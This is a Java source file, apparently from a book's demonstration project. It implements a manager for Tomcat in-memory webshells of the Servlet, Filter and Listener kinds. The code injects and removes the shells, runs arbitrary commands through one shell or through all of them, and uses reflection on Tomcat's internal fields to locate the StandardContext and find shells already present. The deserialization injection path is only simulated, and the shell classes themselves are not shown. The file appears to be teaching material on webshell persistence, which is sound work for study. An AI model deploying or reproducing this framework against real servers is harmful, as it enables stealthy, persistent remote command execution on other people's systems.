package com.book.demo.memshell;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;
import java.lang.reflect.Field;
import org.apache.catalina.Container;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardWrapper;
import jakarta.servlet.Filter;
import jakarta.servlet.Servlet;

/**
 * 内存马统一注入器
 * 用于管理和控制内存马的注入、移除和监控
 */
public class MemoryShellInjector {
    
    private static final Map<String, MemoryShell> activeShells = new ConcurrentHashMap<>();
    private static final AtomicInteger injectionCounter = new AtomicInteger(0);
    private static final List<InjectionRecord> injectionHistory = Collections.synchronizedList(new ArrayList<>());
    private static boolean autoDiscoveryPerformed = false;
    
    static {
        // 系统启动时自动发现已存在的内存马
        performAutoDiscovery();
    }
    
    /**
     * 注入记录
     */
    public static class InjectionRecord {
        private final String id;
        private final MemoryShell.Type type;
        private final String shellName;
        private final long injectionTime;
        private final boolean success;
        private final String errorMessage;
        private final String injectionMethod;
        
        public InjectionRecord(String id, MemoryShell.Type type, String shellName, 
                             boolean success, String errorMessage, String injectionMethod) {
            this.id = id;
            this.type = type;
            this.shellName = shellName;
            this.success = success;
            this.errorMessage = errorMessage;
            this.injectionMethod = injectionMethod;
            this.injectionTime = System.currentTimeMillis();
        }
        
        // Getters
        public String getId() { return id; }
        public MemoryShell.Type getType() { return type; }
        public String getShellName() { return shellName; }
        public long getInjectionTime() { return injectionTime; }
        public boolean isSuccess() { return success; }
        public String getErrorMessage() { return errorMessage; }
        public String getInjectionMethod() { return injectionMethod; }
    }
    
    /**
     * 注入Servlet内存马
     */
    public static InjectionResult injectServletShell() {
        return injectShell(new ServletMemoryShell(), "Direct Injection");
    }
    
    /**
     * 注入Filter内存马
     */
    public static InjectionResult injectFilterShell() {
        return injectShell(new FilterMemoryShell(), "Direct Injection");
    }
    
    /**
     * 注入Listener内存马
     */
    public static InjectionResult injectListenerShell() {
        return injectShell(new ListenerMemoryShell(), "Direct Injection");
    }
    
    /**
     * 通用内存马注入方法
     */
    public static InjectionResult injectShell(MemoryShell shell, String method) {
        try {
            System.out.println("[INJECTOR] 开始注入 " + shell.getType().getName() + ": " + shell.getName());
            
            // 检查是否已经存在相同类型的内存马
            if (hasActiveShellOfType(shell.getType())) {
                String message = "已存在活跃的 " + shell.getType().getName();
                recordInjection(shell, false, message, method);
                return new InjectionResult(false, message, null);
            }
            
            // 执行注入
            boolean success = shell.inject();
            
            if (success) {
                // 注入成功，记录到活跃列表
                activeShells.put(shell.getInfo().getId(), shell);
                injectionCounter.incrementAndGet();
                
                String message = shell.getType().getName() + " 注入成功";
                recordInjection(shell, true, null, method);
                
                System.out.println("[INJECTOR] " + message + " - ID: " + shell.getInfo().getId());
                return new InjectionResult(true, message, shell.getInfo());
                
            } else {
                String message = shell.getType().getName() + " 注入失败";
                recordInjection(shell, false, message, method);
                return new InjectionResult(false, message, null);
            }
            
        } catch (Exception e) {
            String message = "注入异常: " + e.getMessage();
            recordInjection(shell, false, message, method);
            System.err.println("[INJECTOR] " + message);
            e.printStackTrace();
            return new InjectionResult(false, message, null);
        }
    }
    
    /**
     * 通过反序列化注入内存马
     */
    public static InjectionResult injectViaDeserialization(MemoryShell.Type type, byte[] serializedPayload) {
        try {
            System.out.println("[INJECTOR] 通过反序列化注入 " + type.getName());
            
            // 在实际攻击中，这里会反序列化恶意载荷
            // 为了安全，这里只是模拟过程
            
            MemoryShell shell;
            switch (type) {
                case SERVLET:
                    shell = new ServletMemoryShell();
                    break;
                case FILTER:
                    shell = new FilterMemoryShell();
                    break;
                case LISTENER:
                    shell = new ListenerMemoryShell();
                    break;
                default:
                    throw new IllegalArgumentException("不支持的内存马类型: " + type);
            }
            
            return injectShell(shell, "Deserialization");
            
        } catch (Exception e) {
            String message = "反序列化注入失败: " + e.getMessage();
            System.err.println("[INJECTOR] " + message);
            return new InjectionResult(false, message, null);
        }
    }
    
    /**
     * 移除指定的内存马
     */
    public static boolean removeShell(String shellId) {
        try {
            MemoryShell shell = activeShells.get(shellId);
            if (shell == null) {
                System.err.println("[INJECTOR] 内存马不存在: " + shellId);
                return false;
            }
            
            boolean success = shell.remove();
            if (success) {
                activeShells.remove(shellId);
                System.out.println("[INJECTOR] 内存马已移除: " + shellId);
            }
            
            return success;
            
        } catch (Exception e) {
            System.err.println("[INJECTOR] 移除内存马失败: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * 移除所有内存马
     */
    public static int removeAllShells() {
        int removedCount = 0;
        
        List<String> shellIds = new ArrayList<>(activeShells.keySet());
        for (String shellId : shellIds) {
            if (removeShell(shellId)) {
                removedCount++;
            }
        }
        
        System.out.println("[INJECTOR] 共移除 " + removedCount + " 个内存马");
        return removedCount;
    }
    
    /**
     * 获取所有活跃的内存马
     */
    public static Map<String, MemoryShell> getActiveShells() {
        return new HashMap<>(activeShells);
    }
    
    /**
     * 获取指定类型的内存马
     */
    public static MemoryShell getShellByType(MemoryShell.Type type) {
        for (MemoryShell shell : activeShells.values()) {
            if (shell.getType() == type && shell.isActive()) {
                return shell;
            }
        }
        return null;
    }
    
    /**
     * 检查是否存在指定类型的活跃内存马
     */
    public static boolean hasActiveShellOfType(MemoryShell.Type type) {
        return getShellByType(type) != null;
    }
    
    /**
     * 获取统计信息
     */
    public static Map<String, Object> getStatistics() {
        Map<String, Object> stats = new HashMap<>();
        
        stats.put("totalInjections", injectionCounter.get());
        stats.put("activeShells", activeShells.size());
        stats.put("injectionHistory", injectionHistory.size());
        
        // 按类型统计
        Map<String, Integer> typeStats = new HashMap<>();
        for (MemoryShell shell : activeShells.values()) {
            String typeName = shell.getType().getName();
            typeStats.put(typeName, typeStats.getOrDefault(typeName, 0) + 1);
        }
        stats.put("shellsByType", typeStats);
        
        // 成功率统计
        long successCount = injectionHistory.stream()
                .mapToLong(record -> record.isSuccess() ? 1 : 0)
                .sum();
        double successRate = injectionHistory.isEmpty() ? 0.0 : 
                (double) successCount / injectionHistory.size() * 100;
        stats.put("successRate", String.format("%.1f%%", successRate));
        
        return stats;
    }
    
    /**
     * 获取注入历史记录
     */
    public static List<InjectionRecord> getInjectionHistory() {
        return new ArrayList<>(injectionHistory);
    }
    
    /**
     * 清理历史记录
     */
    public static void clearHistory() {
        injectionHistory.clear();
        System.out.println("[INJECTOR] 注入历史记录已清理");
    }
    
    /**
     * 执行内存马命令
     */
    public static String executeCommand(String shellId, String command) {
        try {
            MemoryShell shell = activeShells.get(shellId);
            if (shell == null) {
                return "错误: 内存马不存在 - " + shellId;
            }
            
            if (!shell.isActive()) {
                return "错误: 内存马未激活 - " + shellId;
            }
            
            System.out.println("[INJECTOR] 在内存马 " + shellId + " 中执行命令: " + command);
            return shell.executeCommand(command);
            
        } catch (Exception e) {
            return "命令执行异常: " + e.getMessage();
        }
    }
    
    /**
     * 批量执行命令
     */
    public static Map<String, String> executeCommandOnAll(String command) {
        Map<String, String> results = new HashMap<>();
        
        for (Map.Entry<String, MemoryShell> entry : activeShells.entrySet()) {
            String shellId = entry.getKey();
            String result = executeCommand(shellId, command);
            results.put(shellId, result);
        }
        
        return results;
    }
    
    /**
     * 检测系统中的内存马
     */
    public static List<MemoryShellInfo> detectMemoryShells() {
        List<MemoryShellInfo> detectedShells = new ArrayList<>();
        
        // 返回所有已知的活跃内存马
        for (MemoryShell shell : activeShells.values()) {
            if (shell.isActive()) {
                detectedShells.add(shell.getInfo());
            }
        }
        
        System.out.println("[INJECTOR] 检测到 " + detectedShells.size() + " 个内存马");
        return detectedShells;
    }
    
    /**
     * 健康检查
     */
    public static Map<String, Object> healthCheck() {
        Map<String, Object> health = new HashMap<>();
        
        int activeCount = 0;
        int inactiveCount = 0;
        List<String> failedShells = new ArrayList<>();
        
        for (Map.Entry<String, MemoryShell> entry : activeShells.entrySet()) {
            String shellId = entry.getKey();
            MemoryShell shell = entry.getValue();
            
            try {
                if (shell.isActive()) {
                    activeCount++;
                } else {
                    inactiveCount++;
                    failedShells.add(shellId);
                }
            } catch (Exception e) {
                inactiveCount++;
                failedShells.add(shellId + " (异常: " + e.getMessage() + ")");
            }
        }
        
        health.put("activeShells", activeCount);
        health.put("inactiveShells", inactiveCount);
        health.put("failedShells", failedShells);
        health.put("checkTime", new Date().toString());
        
        return health;
    }
    
    private static void recordInjection(MemoryShell shell, boolean success, String errorMessage, String method) {
        InjectionRecord record = new InjectionRecord(
            shell.getInfo().getId(),
            shell.getType(),
            shell.getName(),
            success,
            errorMessage,
            method
        );
        
        injectionHistory.add(record);
        
        // 限制历史记录大小
        if (injectionHistory.size() > 100) {
            injectionHistory.remove(0);
        }
    }
    
    /**
     * 自动发现已存在的内存马
     */
    public static void performAutoDiscovery() {
        try {
            System.out.println("[INJECTOR] 开始自动发现已存在的内存马...");
            
            StandardContext context = getCurrentStandardContext();
            if (context == null) {
                System.out.println("[INJECTOR] 无法获取StandardContext，跳过自动发现");
                return;
            }
            
            int discovered = 0;
            
            // 发现Servlet内存马
            discovered += discoverServletShells(context);
            
            // 发现Filter内存马
            discovered += discoverFilterShells(context);
            
            // 发现Listener内存马
            discovered += discoverListenerShells(context);
            
            System.out.println("[INJECTOR] 自动发现完成，找到 " + discovered + " 个内存马");
            
        } catch (Exception e) {
            System.err.println("[INJECTOR] 自动发现失败: " + e.getMessage());
        }
    }
    
    /**
     * 发现Servlet内存马
     */
    private static int discoverServletShells(StandardContext context) {
        int count = 0;
        try {
            Container[] children = context.findChildren();
            for (Container child : children) {
                if (child instanceof StandardWrapper) {
                    StandardWrapper wrapper = (StandardWrapper) child;
                    try {
                        Servlet servlet = wrapper.getServlet();
                        if (servlet instanceof MemoryShell) {
                            MemoryShell shell = (MemoryShell) servlet;
                            if (!activeShells.containsKey(shell.getInfo().getId())) {
                                activeShells.put(shell.getInfo().getId(), shell);
                                count++;
                                System.out.println("[INJECTOR] 发现Servlet内存马: " + shell.getName());
                            }
                        }
                    } catch (Exception e) {
                        // 忽略单个Servlet的检查错误
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("[INJECTOR] 发现Servlet内存马失败: " + e.getMessage());
        }
        return count;
    }
    
    /**
     * 发现Filter内存马
     */
    private static int discoverFilterShells(StandardContext context) {
        int count = 0;
        try {
            Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            @SuppressWarnings("unchecked")
            HashMap<String, ApplicationFilterConfig> filterConfigs = 
                (HashMap<String, ApplicationFilterConfig>) filterConfigsField.get(context);
            
            for (ApplicationFilterConfig filterConfig : filterConfigs.values()) {
                try {
                    java.lang.reflect.Method getFilterMethod = ApplicationFilterConfig.class.getDeclaredMethod("getFilter");
                    getFilterMethod.setAccessible(true);
                    Filter filter = (Filter) getFilterMethod.invoke(filterConfig);
                    
                    if (filter instanceof MemoryShell) {
                        MemoryShell shell = (MemoryShell) filter;
                        if (!activeShells.containsKey(shell.getInfo().getId())) {
                            activeShells.put(shell.getInfo().getId(), shell);
                            count++;
                            System.out.println("[INJECTOR] 发现Filter内存马: " + shell.getName());
                        }
                    }
                } catch (Exception e) {
                    // 忽略单个Filter的检查错误
                }
            }
        } catch (Exception e) {
            System.err.println("[INJECTOR] 发现Filter内存马失败: " + e.getMessage());
        }
        return count;
    }
    
    /**
     * 发现Listener内存马
     */
    private static int discoverListenerShells(StandardContext context) {
        int count = 0;
        try {
            // 检查ApplicationEventListeners
            Field eventListenersField = StandardContext.class.getDeclaredField("applicationEventListenersObjects");
            eventListenersField.setAccessible(true);
            Object[] eventListeners = (Object[]) eventListenersField.get(context);
            
            if (eventListeners != null) {
                for (Object listener : eventListeners) {
                    if (listener instanceof MemoryShell) {
                        MemoryShell shell = (MemoryShell) listener;
                        if (!activeShells.containsKey(shell.getInfo().getId())) {
                            activeShells.put(shell.getInfo().getId(), shell);
                            count++;
                            System.out.println("[INJECTOR] 发现EventListener内存马: " + shell.getName());
                        }
                    }
                }
            }
            
            // 检查ApplicationLifecycleListeners
            Field lifecycleListenersField = StandardContext.class.getDeclaredField("applicationLifecycleListenersObjects");
            lifecycleListenersField.setAccessible(true);
            Object[] lifecycleListeners = (Object[]) lifecycleListenersField.get(context);
            
            if (lifecycleListeners != null) {
                for (Object listener : lifecycleListeners) {
                    if (listener instanceof MemoryShell) {
                        MemoryShell shell = (MemoryShell) listener;
                        if (!activeShells.containsKey(shell.getInfo().getId())) {
                            activeShells.put(shell.getInfo().getId(), shell);
                            count++;
                            System.out.println("[INJECTOR] 发现LifecycleListener内存马: " + shell.getName());
                        }
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("[INJECTOR] 发现Listener内存马失败: " + e.getMessage());
        }
        return count;
    }
    
    /**
     * 强制刷新内存马状态（手动触发重新发现）
     */
    public static int refreshMemoryShellStatus() {
        System.out.println("[INJECTOR] 手动刷新内存马状态...");
        
        // 清空当前状态
        activeShells.clear();
        autoDiscoveryPerformed = false;
        
        // 重新执行自动发现
        performAutoDiscovery();
        
        return activeShells.size();
    }
    
    /**
     * 获取当前的StandardContext
     */
    private static StandardContext getCurrentStandardContext() {
        try {
            Thread currentThread = Thread.currentThread();
            ClassLoader classLoader = currentThread.getContextClassLoader();
            
            if (classLoader != null && classLoader.getClass().getName().contains("WebappClassLoader")) {
                // 尝试多种可能的字段名
                String[] fieldNames = {"context", "standardContext", "ctx", "resources"};
                
                for (String fieldName : fieldNames) {
                    try {
                        Field field = classLoader.getClass().getDeclaredField(fieldName);
                        field.setAccessible(true);
                        Object value = field.get(classLoader);
                        
                        if (value instanceof StandardContext) {
                            return (StandardContext) value;
                        }
                        
                        // 如果是Resources对象，尝试获取其context
                        if (value != null && value.getClass().getName().contains("Resources")) {
                            try {
                                Field contextField = value.getClass().getDeclaredField("context");
                                contextField.setAccessible(true);
                                Object contextObj = contextField.get(value);
                                if (contextObj instanceof StandardContext) {
                                    return (StandardContext) contextObj;
                                }
                            } catch (Exception ignored) {}
                        }
                        
                    } catch (NoSuchFieldException ignored) {
                        // 尝试下一个字段名
                    }
                }
                
                // 尝试父类
                Class<?> parentClass = classLoader.getClass().getSuperclass();
                while (parentClass != null && !parentClass.equals(Object.class)) {
                    for (String fieldName : fieldNames) {
                        try {
                            Field field = parentClass.getDeclaredField(fieldName);
                            field.setAccessible(true);
                            Object value = field.get(classLoader);
                            if (value instanceof StandardContext) {
                                return (StandardContext) value;
                            }
                        } catch (Exception ignored) {}
                    }
                    parentClass = parentClass.getSuperclass();
                }
            }
            
        } catch (Exception e) {
            System.err.println("[INJECTOR] 获取StandardContext失败: " + e.getMessage());
        }
        
        return null;
    }
    
    /**
     * 注入结果类
     */
    public static class InjectionResult {
        private final boolean success;
        private final String message;
        private final MemoryShellInfo shellInfo;
        
        public InjectionResult(boolean success, String message, MemoryShellInfo shellInfo) {
            this.success = success;
            this.message = message;
            this.shellInfo = shellInfo;
        }
        
        public boolean isSuccess() { return success; }
        public String getMessage() { return message; }
        public MemoryShellInfo getShellInfo() { return shellInfo; }
        
        @Override
        public String toString() {
            return "InjectionResult{" +
                   "success=" + success +
                   ", message='" + message + '\'' +
                   ", shellInfo=" + shellInfo +
                   '}';
        }
    }
}